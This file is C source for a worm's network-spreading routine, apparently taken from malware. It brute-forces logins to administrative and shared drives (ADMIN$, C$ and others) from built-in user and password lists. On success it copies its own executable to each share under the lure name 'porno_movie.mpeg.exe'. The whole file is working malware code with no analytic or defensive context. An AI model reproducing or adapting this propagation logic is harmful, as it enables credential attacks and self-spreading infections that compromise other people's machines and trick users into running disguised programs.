#include "data_globals.h"
#include <stdio.h>
#include <string.h>

#pragma optimize("", off)
void _NetSpread(uint32_t param_1, LPCSTR param_2)
{
    NETRESOURCEA net_inf;
    char nb_remote[MAX_PATH];
    char *share_name[] = {"SharedDocs", "ADMIN$", "C$", "D$", "E$", "C", "D"};

    volatile DWORD ret_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_ret = (volatile DWORD *)&ret_buf[0];

    volatile DWORD share_cnt_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_share_cnt = (volatile DWORD *)&share_cnt_buf[0];

    volatile DWORD users_cnt_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_users_cnt = (volatile DWORD *)&users_cnt_buf[0];

    volatile DWORD pwd_cnt_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_pwd_cnt = (volatile DWORD *)&pwd_cnt_buf[0];

    for ((*p_share_cnt) = 0; (*p_share_cnt) < 7; (*p_share_cnt)++)
    {
        for ((*p_users_cnt) = 0; (*p_users_cnt) < USERS_NUM; (*p_users_cnt)++)
        {
            for ((*p_pwd_cnt) = 0; (*p_pwd_cnt) < PWD_NUM; (*p_pwd_cnt)++)
            {
                memset(nb_remote, 0, MAX_PATH);
                sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[(*p_share_cnt)]);

                memset(&net_inf, 0, sizeof(net_inf));
                net_inf.dwDisplayType = RESOURCETYPE_ANY;
                net_inf.lpRemoteName = nb_remote;
                net_inf.lpLocalName = NULL;
                net_inf.lpProvider = NULL;

                (*p_ret) = WNetAddConnection2A(&net_inf,
                                          passwords_list[(*p_pwd_cnt)],
                                          users_list[(*p_users_cnt)],
                                          0);

                if ((*p_ret) == NO_ERROR)
                {
                    strcat(nb_remote, "\\porno_movie.mpeg.exe");
                    CopyFileA(param_2, nb_remote, FALSE);

                    memset(nb_remote, 0, MAX_PATH);
                    sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[(*p_share_cnt)]);
                    WNetCancelConnectionA(nb_remote, TRUE);
                }
            }
        }
    }
}
#pragma optimize("", on)
